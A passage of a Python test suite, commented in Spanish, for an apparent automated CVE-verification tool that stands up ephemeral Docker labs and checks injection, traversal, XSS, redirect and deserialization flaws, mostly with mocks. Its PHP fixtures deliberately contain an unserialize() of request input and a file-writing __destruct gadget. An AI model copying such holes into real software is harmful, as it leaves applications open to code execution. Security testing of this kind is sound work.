    # aparte rompio http_ready() con Burp configurado ('WordPress no respondio a tiempo' volvia a
    # salir, con Burp conectado de verdad y sin ningun crash). En vez de seguir malabares con dos
    # funciones de host distintas, el laboratorio efimero ahora NUNCA enruta sus propias
    # peticiones de login/ataque por Burp (ver _wp_login): _lab_host() es la UNICA funcion de
    # host, y no debe cambiar nunca por Burp.
    import binoracle.workflows.wpverify as wv

    monkeypatch.setattr("os.path.exists", lambda p: p == "/.dockerenv")
    monkeypatch.setattr(wv.socket, "gethostbyname", lambda h: "127.0.0.1")

    monkeypatch.setattr(wv, "_burp_client", None)
    assert wv._lab_host() == "host.docker.internal"

    monkeypatch.setattr(wv, "_burp_client", object())
    assert wv._lab_host() == "host.docker.internal"   # _lab_host() NUNCA cambia por Burp
    assert not hasattr(wv, "_attack_lab_host")          # eliminada -- ya no hace falta


def test_wp_login_never_routes_through_burp(monkeypatch):
    # confirmado en vivo: enrutar el login del laboratorio efimero por Burp fue la causa raiz de
    # dos bugs reales distintos (ver test de arriba) -- _wp_login debe usar siempre una
    # requests.Session de verdad, incluso con Burp configurado.
    import binoracle.workflows.wpverify as wv

    monkeypatch.setattr(wv, "_burp_client", object())

    def _boom(*a, **kw):
        raise AssertionError("_make_session() no deberia llamarse desde _wp_login")
    monkeypatch.setattr(wv, "_make_session", _boom)

    class _FakeResp:
        status_code = 200
        text = ""
        cookies = []

    import requests
    monkeypatch.setattr(requests.Session, "post", lambda self, *a, **k: _FakeResp())

    result = wv._wp_login("http://lab.invalid", "user", "pass")
    assert result is None or isinstance(result, requests.Session)


def test_wpverify_deserialization_custom_table_blocked_without_gadget(monkeypatch, tmp_path):
    import binoracle.workflows.wpverify as wv
    monkeypatch.setattr(wv, "_docker_daemon_ok", lambda timeout=8.0: True)
    plugin_dir = tmp_path / "myplugin"
    plugin_dir.mkdir()
    (plugin_dir / "myplugin.php").write_text("<?php\n/*\nPlugin Name: My Plugin\n*/\n")
    res = wv.verify_wordpress_deserialization_custom_table(
        str(tmp_path), "myplugin", "/wp-admin/admin-ajax.php", "POST", {},
        table_name="wp_myplugin_tokens", column_name="token_data")
    assert res.verified is False
    assert res.limitations


def test_wpverify_deserialization_custom_table_blocked_without_table_hint(monkeypatch, tmp_path):
    import binoracle.workflows.wpverify as wv
    monkeypatch.setattr(wv, "_docker_daemon_ok", lambda timeout=8.0: True)
    plugin_dir = tmp_path / "myplugin"
    plugin_dir.mkdir()
    (plugin_dir / "myplugin.php").write_text(
        "<?php\nclass CacheWriter {\n"
        "    public $cacheFile;\n    public $cacheData;\n"
        "    public function __destruct() {\n"
        "        file_put_contents($this->cacheFile, $this->cacheData);\n"
        "    }\n}\n")
    res = wv.verify_wordpress_deserialization_custom_table(
        str(tmp_path), "myplugin", "/wp-admin/admin-ajax.php", "POST", {},
        table_name="", column_name="")
    assert res.verified is False
    assert res.limitations
    assert "tabla" in res.detail


def test_drupalverify_deserialization_blocked_without_gadget(monkeypatch, tmp_path):
    import binoracle.workflows.drupalverify as dv
    monkeypatch.setattr(dv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "mymodule").mkdir()
    res = dv.verify_drupal_deserialization(str(tmp_path), "mymodule", "/mymodule/import", "POST",
                                            ["data"])
    assert res.verified is False
    assert res.limitations


def test_joomlaverify_deserialization_blocked_without_gadget(monkeypatch, tmp_path):
    import binoracle.workflows.joomlaverify as jv
    monkeypatch.setattr(jv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "myext").mkdir()
    res = jv.verify_joomla_deserialization(str(tmp_path), "myext", "/index.php?option=com_myext",
                                           "POST", ["data"])
    assert res.verified is False
    assert res.limitations


def test_cve_agent_deterministic_hints_recognizes_wp_rest_route(tmp_path):
    from binoracle.workflows.cve_agent import _deterministic_web_hints_from_source
    (tmp_path / "rest-plugin.php").write_text(
        "<?php\nclass MyRestController {\n"
        "    public function register_routes() {\n"
        "        register_rest_route('myplugin/v1', '/import-settings', array(\n"
        "            'methods' => 'POST',\n"
        "            'callback' => array($this, 'import_settings'),\n"
        "        ));\n"
        "    }\n\n"
        "    public function import_settings($request) {\n"
        "        $data = $request->get_param('data');\n"
        "        $obj = unserialize($data);\n"
        "    }\n"
        "}\n")
    found = {"import_settings": ["rest-plugin.php:10"]}
    r = _deterministic_web_hints_from_source(str(tmp_path), found)
    assert r is not None
    assert r["endpoint"] == "/wp-json/myplugin/v1/import-settings"
    assert r["http_method"] == "POST"
    assert "data" in r["parameters"]


def test_cve_agent_deterministic_hints_still_recognizes_ajax_action(tmp_path):
    # regresion: la nueva deteccion de REST no debe romper el camino de admin-ajax.php existente.
    from binoracle.workflows.cve_agent import _deterministic_web_hints_from_source
    (tmp_path / "ajax-plugin.php").write_text(
        "<?php\nadd_action('wp_ajax_myaction', 'handle_it');\n"
        "function handle_it() {\n"
        "    $email = $_POST['email'];\n"
        "}\n")
    found = {"handle_it": ["ajax-plugin.php:3"]}
    r = _deterministic_web_hints_from_source(str(tmp_path), found)
    assert r is not None
    assert r["endpoint"] == "/wp-admin/admin-ajax.php?action=myaction"
    assert "email" in r["parameters"]


def test_cve_agent_deterministic_hints_drupal_routing_yml(tmp_path):
    from binoracle.workflows.cve_agent import _deterministic_drupal_hints_from_source
    mod = tmp_path / "mymodule"
    (mod / "src" / "Controller").mkdir(parents=True)
    (mod / "mymodule.routing.yml").write_text(
        "mymodule.update_profile:\n"
        "  path: '/mymodule/update-profile/{uid}'\n"
        "  defaults:\n"
        "    _controller: '\\Drupal\\mymodule\\Controller\\ProfileController::updateProfile'\n"
        "  methods: [POST]\n")
    (mod / "src" / "Controller" / "ProfileController.php").write_text(
        "<?php\nnamespace Drupal\\mymodule\\Controller;\n"
        "class ProfileController {\n"
        "    public function updateProfile($request) {\n"
        "        $uid = $request->request->get('user_id');\n"
        "        $email = $request->request->get('new_email');\n"
        "    }\n}\n")
    found = {"updateProfile": ["src/Controller/ProfileController.php:4"]}
    r = _deterministic_drupal_hints_from_source(str(mod), found)
    assert r is not None
    assert r["endpoint"] == "/mymodule/update-profile/{uid}"
    assert r["http_method"] == "POST"
    assert "user_id" in r["parameters"] and "new_email" in r["parameters"]


def test_cve_agent_deterministic_hints_joomla_input_and_task(tmp_path):
    from binoracle.workflows.cve_agent import _deterministic_joomla_hints_from_source
    ext = tmp_path / "myext"
    ext.mkdir()
    (ext / "myext.php").write_text(
        "<?php\nclass MyExtController {\n"
        "    public function handle() {\n"
        "        $task = $this->input->getCmd('task');\n"
        "        if ($task === 'updateuser') {\n"
        "            $userId = $this->input->getInt('user_id');\n"
        "            $email = $this->input->getString('email');\n"
        "        }\n    }\n}\n")
    found = {"handle": ["myext.php:3"]}
    r = _deterministic_joomla_hints_from_source(str(ext), found, "myext")
    assert r is not None
    assert r["endpoint"] == "/index.php?option=com_myext&task=updateuser"
    assert "user_id" in r["parameters"] and "email" in r["parameters"]


def test_cve_agent_deterministic_hints_drupal_detects_path_bound_id(tmp_path):
    # regresion: un placeholder EN LA RUTA ('{uid}') se enlaza como argumento del metodo por
    # Symfony, nunca via $request->get() -- debe reconocerse como id_param para que
    # drupalverify.py lo sustituya en la URL en vez de mandarlo como parametro de query/body.
    from binoracle.workflows.cve_agent import _deterministic_drupal_hints_from_source
    mod = tmp_path / "mymodule"
    (mod / "src" / "Controller").mkdir(parents=True)
    (mod / "mymodule.routing.yml").write_text(
        "mymodule.update_profile:\n"
        "  path: '/mymodule/update-profile/{uid}'\n"
        "  defaults:\n"
        "    _controller: '\\Drupal\\mymodule\\Controller\\ProfileController::updateProfile'\n"
        "  methods: [POST]\n")
    (mod / "src" / "Controller" / "ProfileController.php").write_text(
        "<?php\nnamespace Drupal\\mymodule\\Controller;\n"
        "class ProfileController {\n"
        "    public function updateProfile($uid, $request) {\n"
        "        $email = $request->request->get('new_email');\n"
        "    }\n}\n")
    found = {"updateProfile": ["src/Controller/ProfileController.php:4"]}
    r = _deterministic_drupal_hints_from_source(str(mod), found)
    assert r is not None
    assert r["endpoint"] == "/mymodule/update-profile/{uid}"
    assert r["id_param"] == "uid"
    assert "new_email" in r["parameters"]


def test_drupalverify_substitute_path_param():
    from binoracle.workflows.drupalverify import _substitute_path_param
    assert _substitute_path_param("/mymodule/update/{uid}", "uid", "1") == (
        "/mymodule/update/1", True)
    assert _substitute_path_param("/mymodule/update", "uid", "1") == (
        "/mymodule/update", False)
    assert _substitute_path_param("/mymodule/update", "", "1") == ("/mymodule/update", False)


# --- manejo de Ctrl+C y errores en el CLI (nunca un traceback crudo) ---

def test_cli_main_handles_keyboard_interrupt_cleanly(monkeypatch, capsys):
    from binoracle import cli
    monkeypatch.setattr(cli, "cmd_doctor", lambda args, config: (_ for _ in ()).throw(KeyboardInterrupt()))
    rc = cli.main(["doctor"])
    assert rc == 130
    assert "abortado por el usuario" in capsys.readouterr().err


def test_cli_main_handles_unexpected_error_without_traceback(monkeypatch, capsys):
    from binoracle import cli
    monkeypatch.setattr(cli, "cmd_doctor", lambda args, config: (_ for _ in ()).throw(ValueError("boom")))
    rc = cli.main(["doctor"])
    assert rc == 1
    err = capsys.readouterr().err
    assert "error inesperado: boom" in err
    assert "Traceback" not in err


def test_cli_main_debug_flag_reraises_full_traceback(monkeypatch):
    from binoracle import cli
    monkeypatch.setattr(cli, "cmd_doctor", lambda args, config: (_ for _ in ()).throw(ValueError("boom")))
    with __import__("pytest").raises(ValueError):
        cli.main(["--debug", "doctor"])


# --- genericverify.py: verificacion dinamica CMS-agnostica (cualquier entorno con su propio
# Dockerfile/docker-compose.yml) ---

def test_genericverify_find_build_target_prefers_compose(tmp_path):
    from binoracle.workflows.genericverify import _find_build_target
    (tmp_path / "docker-compose.yml").write_text("services: {}\n")
    (tmp_path / "Dockerfile").write_text("FROM scratch\n")
    target = _find_build_target(str(tmp_path))
    assert target["kind"] == "compose"


def test_genericverify_find_build_target_falls_back_to_dockerfile(tmp_path):
    from binoracle.workflows.genericverify import _find_build_target
    (tmp_path / "Dockerfile").write_text("FROM scratch\nEXPOSE 5000\n")
    target = _find_build_target(str(tmp_path))
    assert target["kind"] == "dockerfile"
    assert target["path"].endswith("Dockerfile")


def test_genericverify_find_build_target_none_without_either(tmp_path):
    from binoracle.workflows.genericverify import _find_build_target
    (tmp_path / "README.md").write_text("no docker here\n")
    assert _find_build_target(str(tmp_path)) is None


def test_genericverify_auto_detects_node_stack_without_dockerfile(tmp_path):
    # pedido explicitamente: no limitarse a repos que YA traen su propio Dockerfile/compose --
    # si el repo trae package.json (Node) pero nada mas, se genera un Dockerfile minimo propio.
    from binoracle.workflows.genericverify import _find_build_target, _AUTO_DOCKERFILE_NAME
    (tmp_path / "package.json").write_text('{"name": "poc", "scripts": {"start": "node x.js"}}')
    target = _find_build_target(str(tmp_path))
    assert target is not None
    assert target["kind"] == "dockerfile"
    assert target["auto_generado"] is True
    assert target["stack_detectado"] == "package.json"
    assert target["path"] == str(tmp_path / _AUTO_DOCKERFILE_NAME)
    content = (tmp_path / _AUTO_DOCKERFILE_NAME).read_text()
    assert "FROM node:" in content
    assert "npm install" in content


def test_genericverify_auto_detects_python_stack_without_dockerfile(tmp_path):
    from binoracle.workflows.genericverify import _find_build_target
    (tmp_path / "requirements.txt").write_text("flask\n")
    target = _find_build_target(str(tmp_path))
    assert target["auto_generado"] is True
    assert target["stack_detectado"] == "requirements.txt"
    content = open(target["path"]).read()
    assert "FROM python:" in content
    assert "pip install" in content


def test_genericverify_auto_detects_composer_php_stack_without_dockerfile(tmp_path):
    from binoracle.workflows.genericverify import _find_build_target
    (tmp_path / "composer.json").write_text('{"require": {}}')
    target = _find_build_target(str(tmp_path))
    assert target["auto_generado"] is True
    assert target["stack_detectado"] == "composer.json"
    content = open(target["path"]).read()
    assert "FROM php:" in content
    assert "composer install" in content


def test_genericverify_auto_detects_bare_php_without_any_manifest(tmp_path):
    # el caso mas comun en un PoC publico de un solo plugin/script vulnerable: unos cuantos
    # ficheros .php sueltos, sin composer.json ni ningun Dockerfile/compose -- el servidor de
    # desarrollo embebido de PHP sirve cualquiera de ellos tal cual, sin entender el proyecto.
    from binoracle.workflows.genericverify import _find_build_target
    (tmp_path / "vuln.php").write_text("<?php echo 'hi'; ?>")
    target = _find_build_target(str(tmp_path))
    assert target["auto_generado"] is True
    assert "php" in target["stack_detectado"]
    content = open(target["path"]).read()
    assert "FROM php:" in content
    assert '-S", "0.0.0.0:8000"' in content


def test_genericverify_prefers_dockerfile_compose_over_auto_detection(tmp_path):
    # si el repo SI trae su propio Dockerfile/compose, nunca se genera uno propio por encima --
    # el del autor del PoC siempre gana.
    from binoracle.workflows.genericverify import _find_build_target
    (tmp_path / "package.json").write_text('{"name": "poc"}')
    (tmp_path / "Dockerfile").write_text("FROM node:18\nEXPOSE 3000\n")
    target = _find_build_target(str(tmp_path))
    assert not target.get("auto_generado")
    assert target["path"].endswith("Dockerfile") and "auto" not in target["path"].lower()


def test_bootstrap_generic_lab_flags_auto_generated_dockerfile_as_a_limitation(monkeypatch, tmp_path):
    # cuando el Dockerfile es nuestro (no del autor del PoC), el informe debe dejarlo EXPLICITO
    # -- nunca presentar un entorno que montamos nosotros a ciegas como si fuera el real del PoC.
    import binoracle.workflows.genericverify as gv
    from binoracle.workflows.wpverify import WpVerifyResult

    (tmp_path / "requirements.txt").write_text("flask\n")

    class _FakeCompletedProcess:
        returncode = 0
        stdout = ""
        stderr = ""

    class _FakeLab:
        def __init__(self, tag):
            pass
        def build_and_run(self, target, **kw):
            return _FakeCompletedProcess()
        def discover_http(self, **kw):
            return ("fake-container", "8080")
        def teardown(self):
            pass

    monkeypatch.setattr(gv, "_GenericLab", _FakeLab)

    res = WpVerifyResult()
    boot = gv._bootstrap_generic_lab(str(tmp_path), lambda _m: None, res, 900.0)

    assert boot is not None
    assert res.evidence.get("dockerfile_auto_generado") is True
    assert res.evidence.get("stack_detectado") == "requirements.txt"
    assert any("Dockerfile/docker-compose.yml" in lim for lim in res.limitations)


def test_genericverify_exposed_ports_from_dockerfile(tmp_path):
    from binoracle.workflows.genericverify import _exposed_ports_from_dockerfile
    df = tmp_path / "Dockerfile"
    df.write_text("FROM python:3.11-slim\nEXPOSE 5000\nEXPOSE 8080 8081\n")
    assert _exposed_ports_from_dockerfile(str(df)) == [5000, 8080, 8081]


def test_genericverify_command_injection_blocked_without_docker(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: False)
    res = gv.verify_generic_command_injection(str(tmp_path), "/ping", "POST", {"host": "x"})
    assert res.available is False
    assert res.verified is False


def test_genericverify_command_injection_blocked_without_build_target(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "README.md").write_text("no docker here\n")
    res = gv.verify_generic_command_injection(str(tmp_path), "/ping", "POST", {"host": "x"})
    assert res.verified is False
    assert res.limitations
    assert "Dockerfile" in res.limitations[0]


def test_cve_agent_dispatches_generic_command_injection_for_unrecognized_source(monkeypatch, tmp_path):
    # "cualquier entorno": cuando el codigo descargado no es un plugin/modulo/extension
    # reconocido (sin plugin_dir), pero vuln_class es command-injection con un endpoint, el
    # pipeline tiene que caer en el verificador generico (genericverify.py) en vez de bloquearse
    # solo porque no es WordPress/Drupal/Joomla.
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, genericverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="git", source=target,
                                           local_path=str(tmp_path), plugin_dir="")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    called = {}
    def fake_generic_ci(local_path, endpoint, method, params, cmd_param_hint="", on_step=None,
                        budget_s=900.0):
        called["endpoint"] = endpoint
        called["local_path"] = local_path
        from binoracle.workflows.wpverify import WpVerifyResult
        return WpVerifyResult(ok=True, available=True, verified=True,
                              detail="COMMAND INJECTION confirmada (fake)")
    monkeypatch.setattr(genericverify, "verify_generic_command_injection", fake_generic_ci)

    inv = Investigation(cve_id="CVE-2099-00001")
    inv.vuln_class = "command-injection"
    inv.llm_notes = {"source_url": "https://example.com/some-generic-app.git",
                     "endpoint": "/ping", "http_method": "POST", "parameters": {"host": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None)
    assert called.get("endpoint") == "/ping"
    assert called.get("local_path") == str(tmp_path)
    assert inv.verified is True


def test_genericverify_path_traversal_blocked_without_param(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    res = gv.verify_generic_path_traversal(str(tmp_path), "/view", "GET", {})
    assert res.verified is False
    assert res.limitations
    assert "parametro" in res.limitations[0]


def test_genericverify_path_traversal_blocked_without_build_target(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "README.md").write_text("no docker here\n")
    res = gv.verify_generic_path_traversal(str(tmp_path), "/view", "GET", {"page": "x"},
                                           path_param_hint="page")
    assert res.verified is False
    assert res.limitations
    assert "Dockerfile" in res.limitations[0]


def test_genericverify_path_traversal_surfaces_real_response_body_on_negative(monkeypatch, tmp_path):
    # mismo gap que ya se cerro en verify_wordpress_path_traversal: sin el cuerpo real de cada
    # intento, un negativo generico (cualquier tecnologia, no solo WordPress) es indiagnosticable
    # sin relanzar el ataque a mano.
    import binoracle.workflows.genericverify as gv

    class _FakeLab:
        def teardown(self):
            pass
        def write_canary(self, container, path, secret):
            return True

    def fake_http_request(method, url, **kw):
        class _R:
            status_code = 404
            text = '{"error":"not found"}'
        return _R()

    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    monkeypatch.setattr(gv, "_bootstrap_generic_lab",
                        lambda *a, **kw: (_FakeLab(), "http://lab.invalid", "app"))
    monkeypatch.setattr(gv, "_http_request", fake_http_request)

    res = gv.verify_generic_path_traversal(str(tmp_path), "/view", "GET", {"page": "x"},
                                           path_param_hint="page")

    assert res.verified is False
    assert all("respuesta_cuerpo_recorte" in t for t in res.evidence["intentos"])
    assert res.evidence.get("respuesta_muestra_primer_intento") == '{"error":"not found"}'


def test_cve_agent_command_injection_retries_with_llm_suggestion(monkeypatch, tmp_path):
    # pedido explicitamente: el bucle de aprendizaje-y-reintento tiene que llegar a TODOS los
    # ataques y casos, no solo a los 3 primeros (SQLi, path-traversal WP, path-traversal
    # generico) -- esto comprueba que ya cubre tambien command injection de WordPress.
    import json as _json
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, wpverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="wordpress-plugin", source=target,
                                           local_path=str(tmp_path), plugin_dir="some-plugin")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "tiene_sugerencia": True,
                "razon": "el cuerpo muestra un 404 de la propia app",
                "endpoint_alternativo": "/wp-admin/admin-ajax.php?action=run_tool",
            })

    calls = []
    def fake_cmdi(plugin_source_dir, slug, endpoint, http_method, parameters,
                  cmd_param_hint="", on_step=None, budget_s=1200.0, companion_plugins=None):
        calls.append(endpoint)
        if "run_tool" not in (endpoint or ""):
            wr = wpverify.WpVerifyResult(ok=True, available=True, verified=False,
                                         detail="no se confirmo")
            wr.evidence = {"respuesta_cuerpo_recorte": "<html>404 not found</html>"}
            return wr
        return wpverify.WpVerifyResult(ok=True, available=True, verified=True,
                                       detail="COMMAND INJECTION confirmado tras el reintento (fake)")
    monkeypatch.setattr(wpverify, "verify_wordpress_command_injection", fake_cmdi)

    inv = Investigation(cve_id="CVE-2099-00016")
    inv.vuln_class = "command-injection"
    inv.llm_notes = {"source_url": "some-plugin", "endpoint": "/wp-admin/admin-ajax.php?action=x",
                     "http_method": "GET", "parameters": {"cmd": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None, llm=_FakeLLM())

    assert calls == ["/wp-admin/admin-ajax.php?action=x",
                     "/wp-admin/admin-ajax.php?action=run_tool"]
    assert inv.verified is True
    assert "sugerido por el LLM" in inv.verified_detail


def test_cve_agent_generic_command_injection_retries_with_llm_suggestion(monkeypatch, tmp_path):
    import json as _json
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, genericverify
    from binoracle.workflows.wpverify import WpVerifyResult

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="git", source=target,
                                           local_path=str(tmp_path), plugin_dir="")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "tiene_sugerencia": True,
                "razon": "el cuerpo muestra un 405 method not allowed",
                "endpoint_alternativo": "/api/run",
            })

    calls = []
    def fake_cmdi(source_dir, endpoint, http_method, parameters, cmd_param_hint="",
                 on_step=None, budget_s=900.0):
        calls.append(endpoint)
        if endpoint == "/exec":
            wr = WpVerifyResult(ok=True, available=True, verified=False, detail="no se confirmo")
            wr.evidence = {"respuesta_cuerpo_recorte": "<html>405 method not allowed</html>"}
            return wr
        return WpVerifyResult(ok=True, available=True, verified=True,
                              detail="COMMAND INJECTION confirmado tras el reintento (fake)")
    monkeypatch.setattr(genericverify, "verify_generic_command_injection", fake_cmdi)

    inv = Investigation(cve_id="CVE-2099-00018")
    inv.vuln_class = "command-injection"
    inv.llm_notes = {"source_url": "https://example.com/some-generic-app.git",
                     "endpoint": "/exec", "http_method": "POST", "parameters": {"cmd": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None, llm=_FakeLLM())

    assert calls == ["/exec", "/api/run"]
    assert inv.verified is True
    assert "sugerido por el LLM" in inv.verified_detail


def test_cve_agent_open_redirect_retries_with_llm_suggestion(monkeypatch, tmp_path):
    import json as _json
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, wpverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="wordpress-plugin", source=target,
                                           local_path=str(tmp_path), plugin_dir="some-plugin")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "tiene_sugerencia": True,
                "razon": "status=200, nunca hubo un redirect -- el endpoint probablemente no es el correcto",
                "endpoint_alternativo": "/wp-admin/admin-ajax.php?action=go",
            })

    calls = []
    def fake_or(plugin_source_dir, slug, endpoint, http_method, parameters,
               redirect_param_hint="", on_step=None, budget_s=1200.0, companion_plugins=None):
        calls.append(endpoint)
        if "action=go" not in (endpoint or ""):
            wr = wpverify.WpVerifyResult(ok=True, available=True, verified=False,
                                         detail="no se confirmo")
            wr.evidence = {"respuesta_cuerpo_recorte": "status=200 location=''"}
            return wr
        return wpverify.WpVerifyResult(ok=True, available=True, verified=True,
                                       detail="OPEN REDIRECT confirmado tras el reintento (fake)")
    monkeypatch.setattr(wpverify, "verify_wordpress_open_redirect", fake_or)

    inv = Investigation(cve_id="CVE-2099-00019")
    inv.vuln_class = "open-redirect"
    inv.llm_notes = {"source_url": "some-plugin", "endpoint": "/wp-admin/admin-ajax.php?action=x",
                     "http_method": "GET", "parameters": {"url": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None, llm=_FakeLLM())

    assert calls == ["/wp-admin/admin-ajax.php?action=x", "/wp-admin/admin-ajax.php?action=go"]
    assert inv.verified is True
    assert "sugerido por el LLM" in inv.verified_detail


def test_cve_agent_xss_retries_with_llm_suggestion(monkeypatch, tmp_path):
    import json as _json
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, genericverify
    from binoracle.workflows.wpverify import WpVerifyResult

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="git", source=target,
                                           local_path=str(tmp_path), plugin_dir="")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "tiene_sugerencia": True,
                "razon": "el cuerpo muestra un error 500 de la app",
                "endpoint_alternativo": "/search",
            })

    calls = []
    def fake_xss(source_dir, endpoint, http_method, parameters, xss_param_hint="",
                on_step=None, budget_s=900.0):
        calls.append(endpoint)
        if endpoint == "/comment":
            wr = WpVerifyResult(ok=True, available=True, verified=False, detail="no se confirmo")
            wr.evidence = {"respuesta_cuerpo_recorte": "<html>500 internal error</html>"}
            return wr
        return WpVerifyResult(ok=True, available=True, verified=True,
                              detail="XSS confirmado tras el reintento (fake)")
    monkeypatch.setattr(genericverify, "verify_generic_xss", fake_xss)

    inv = Investigation(cve_id="CVE-2099-00020")
    inv.vuln_class = "xss"
    inv.llm_notes = {"source_url": "https://example.com/some-generic-app.git",
                     "endpoint": "/comment", "http_method": "POST", "parameters": {"body": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None, llm=_FakeLLM())

    assert calls == ["/comment", "/search"]
    assert inv.verified is True
    assert "sugerido por el LLM" in inv.verified_detail


def test_cve_agent_drupal_sqli_retries_with_llm_suggestion(monkeypatch, tmp_path):
    # pedido explicitamente: "sigue con drupal y joomla tambien" -- el bucle de aprendizaje-y-
    # reintento tiene que llegar tambien a los verificadores de Drupal, no solo WordPress/generico.
    import json as _json
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, drupalverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="drupal-module", source=target,
                                           local_path=str(tmp_path), plugin_dir="some_module")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "tiene_sugerencia": True,
                "razon": "la respuesta de control parece una pagina de acceso denegado",
                "endpoint_alternativo": "/node/1/other-endpoint",
            })

    calls = []
    def fake_sqli(module_source_dir, slug, endpoint, http_method, parameters,
                 sqli_param_hint="", on_step=None, budget_s=1200.0):
        calls.append(endpoint)
        if "other-endpoint" not in (endpoint or ""):
            wr = drupalverify.WpVerifyResult(ok=True, available=True, verified=False,
                                             detail="no se confirmo")
            wr.evidence = {"respuesta_control_recorte": "<html>access denied</html>"}
            return wr
        return drupalverify.WpVerifyResult(ok=True, available=True, verified=True,
                                           detail="SQLI confirmada tras el reintento (fake)")
    monkeypatch.setattr(drupalverify, "verify_drupal_sqli", fake_sqli)

    inv = Investigation(cve_id="CVE-2099-00021")
    inv.vuln_class = "sqli"
    inv.llm_notes = {"source_url": "some_module", "endpoint": "/node/1",
                     "http_method": "GET", "parameters": {"id": "1"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None, llm=_FakeLLM())

    assert calls == ["/node/1", "/node/1/other-endpoint"]
    assert inv.verified is True
    assert "sugerido por el LLM" in inv.verified_detail


def test_cve_agent_drupal_path_traversal_retries_with_llm_suggestion(monkeypatch, tmp_path):
    import json as _json
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, drupalverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="drupal-module", source=target,
                                           local_path=str(tmp_path), plugin_dir="some_module")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "tiene_sugerencia": True,
                "razon": "el cuerpo muestra un 404 de Drupal",
                "endpoint_alternativo": "/node/2/download",
            })

    calls = []
    def fake_pt(module_source_dir, slug, endpoint, http_method, parameters,
               path_param_hint="", on_step=None, budget_s=1200.0):
        calls.append(endpoint)
        if "download" not in (endpoint or ""):
            wr = drupalverify.WpVerifyResult(ok=True, available=True, verified=False,
                                             detail="no se confirmo")
            wr.evidence = {"respuesta_muestra_primer_intento": '{"error":"Page not found"}'}
            return wr
        return drupalverify.WpVerifyResult(ok=True, available=True, verified=True,
                                           detail="PATH TRAVERSAL confirmado tras el reintento (fake)")
    monkeypatch.setattr(drupalverify, "verify_drupal_path_traversal", fake_pt)

    inv = Investigation(cve_id="CVE-2099-00022")
    inv.vuln_class = "path-traversal"
    inv.llm_notes = {"source_url": "some_module", "endpoint": "/node/1",
                     "http_method": "GET", "parameters": {"file": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None, llm=_FakeLLM())

    assert calls == ["/node/1", "/node/2/download"]
    assert inv.verified is True
    assert "sugerido por el LLM" in inv.verified_detail


def test_cve_agent_ssrf_retries_with_llm_suggestion(monkeypatch, tmp_path):
    # SSRF se habia dejado fuera porque la unica evidencia capturada era el log del listener
    # (que no da pistas de endpoint equivocado) -- tras anadir captura del cuerpo de la
    # respuesta PROPIA del endpoint (independiente del listener), ya tiene sentido conectarlo.
    import json as _json
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
